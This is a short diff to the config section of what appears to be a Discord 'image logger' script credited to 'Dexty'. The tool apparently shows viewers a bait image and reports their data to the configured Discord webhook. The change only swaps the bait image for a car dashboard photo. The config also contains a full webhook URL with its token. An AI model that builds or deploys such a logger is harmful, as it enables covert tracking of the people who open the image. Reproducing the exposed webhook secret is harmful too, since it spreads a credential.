@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1374640893121921114/UiFw9OREFPkily1ERr9UAaRvCzrO2v529pVIyMAFeuss6yf35pp7aw4ZfEHmYBy3Bpkn",
-    "image": "https://i.pinimg.com/originals/de/55/5f/de555fa745a370a92cb223a4027be218.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://static1.hotcarsimages.com/wordpress/wp-content/uploads/2022/09/2023-toyota-gr-corolla-interior-dashboard-view.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
